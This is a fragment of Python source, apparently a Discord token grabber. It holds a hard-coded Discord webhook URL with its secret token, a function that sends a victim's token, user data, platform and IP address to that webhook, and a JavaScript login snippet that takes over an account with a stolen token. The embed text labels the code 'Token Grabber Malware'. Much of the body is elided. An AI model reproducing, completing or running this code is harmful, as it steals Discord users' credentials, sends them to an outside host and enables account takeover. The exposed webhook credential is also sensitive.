WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496851468018385093/I4v1z6i5xMWexOtn6qlmAdoTSOMjo-dyOp-_MKE9ChSWX_Pi0liH8DPrsWIgxPjvPCt8'
import os
...
def send_token_info(token, user_data, platform, ip):
    ...
    "login('" + str(token) + "');"
        ...
        embed = {
            "username": "SHHH... KAIE IS WATCHING",
            ...
            "embeds": [
                {
                    ...
                    "description": f"> KAIE ALWAYS WATCHING YOU | **WAG SUBUKAN ILEAK** | `Token Grabber Malware`",
                    "color": 16711680,
                    "image": {
